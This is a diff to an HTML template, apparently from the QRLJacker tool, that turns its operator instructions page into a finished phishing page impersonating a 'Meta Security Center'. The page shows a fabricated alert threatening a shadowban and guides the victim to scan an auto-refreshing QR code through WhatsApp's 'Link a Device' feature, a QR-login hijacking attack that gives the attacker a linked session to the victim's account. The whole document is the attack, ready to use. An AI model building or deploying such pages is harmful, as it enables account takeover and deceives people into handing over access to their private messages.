@@ -1,18 +1,187 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<title>{{name}}</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Security Center - Verification</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap');
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #000000;
+            color: #e9edef;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        
+        .card {
+            background-color: #111b21;
+            border: 1px solid #233138;
+            border-radius: 12px;
+            padding: 40px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.6);
+            animation: fadeIn 0.5s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        
+        .meta-logo {
+            font-size: 28px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 5px;
+            letter-spacing: -0.5px;
+        }
+        
+        .meta-logo span {
+            color: #00a884; /* WhatsApp Green */
+        }
+        
+        .alert-box {
+            background-color: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            border-radius: 8px;
+            padding: 14px;
+            margin: 25px 0;
+            font-size: 13.5px;
+            color: #fca5a5;
+            text-align: left;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+        
+        .qr-container {
+            background: #ffffff;
+            padding: 12px;
+            border-radius: 8px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        
+        #qrcodew {
+            width: 250px;
+            height: 250px;
+            display: block;
+        }
+        
+        .instructions {
+            text-align: left;
+            margin-top: 30px;
+            background: #202c33;
+            border-radius: 8px;
+            padding: 22px;
+        }
+        
+        .instructions h3 {
+            margin: 0 0 15px 0;
+            font-size: 15px;
+            color: #00a884;
+            font-weight: 600;
+        }
+        
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 14px;
+            font-size: 14px;
+            color: #8696a0;
+            line-height: 1.5;
+        }
+        
+        .step:last-child {
+            margin-bottom: 0;
+        }
+        
+        .step-num {
+            background: #38464e;
+            color: #e9edef;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 600;
+            margin-right: 14px;
+            flex-shrink: 0;
+            margin-top: 0px;
+        }
+        
+        .step strong {
+            color: #e9edef;
+        }
+        
+        .footer {
+            margin-top: 25px;
+            font-size: 13px;
+            color: #8696a0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+    </style>
 </head>
 <body>
-<script>
-var myTimer; myTimer = window.setInterval(reloadD,3000);
-function reloadD(){ d = new Date(); document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();}
-</script>
-<center><h1><b>QRLJacker: {{name}}</b></h1>
-Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
-</br>1. This is your always updated {{name}} QR Code
-</b><img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;">
-</br>2. Edit phishing_page.html file by adding your phishing page source code, style, resources, etc.. (located inside framework in path core/templates/phishing_page.html)
-</br>3. Point your victim to your phishing <a href='http://localhost:{{port}}/'>URL</a>, Convince to scan the QR code and Bob is your uncle!
-</center>
+    <script>
+        var myTimer = window.setInterval(reloadD, 3000);
+        function reloadD() { 
+            var d = new Date(); 
+            var img = document.getElementById('qrcodew');
+            if(img) {
+                img.src = "tmp.png?h=" + d.getTime();
+            }
+        }
+    </script>
+    
+    <div class="card">
+        <div class="meta-logo">Meta <span>Security</span></div>
+        <p style="color: #8696a0; font-size: 14.5px; margin-top: 0;">Account Protection Center</p>
+        
+        <div class="alert-box">
+            <svg style="width: 22px; height: 22px; flex-shrink: 0; margin-top: 2px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+            <div>
+                <strong>Action Required</strong><br>
+                We detected unauthorized automated requests originating from your IP. You must cryptographically verify your active session to prevent a 24-hour shadowban.
+            </div>
+        </div>
+        
+        <div class="qr-container">
+            <img id="qrcodew" alt="Security QR Code" src="tmp.png">
+        </div>
+
+        <div class="instructions">
+            <h3>Human Verification Protocol</h3>
+            <div class="step">
+                <div class="step-num">1</div>
+                <div>Open <strong>WhatsApp</strong> on your mobile device.</div>
+            </div>
+            <div class="step">
+                <div class="step-num">2</div>
+                <div>Navigate to <strong>Settings</strong> and tap <strong>Linked Devices</strong>.</div>
+            </div>
+            <div class="step">
+                <div class="step-num">3</div>
+                <div>Tap <strong>"Link a Device"</strong> and scan this secure verification code to authenticate your session.</div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <svg style="width: 14px; height: 14px; fill: #00a884;" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+            End-to-End Encrypted Verification
+        </div>
+    </div>
 </body>
 </html>
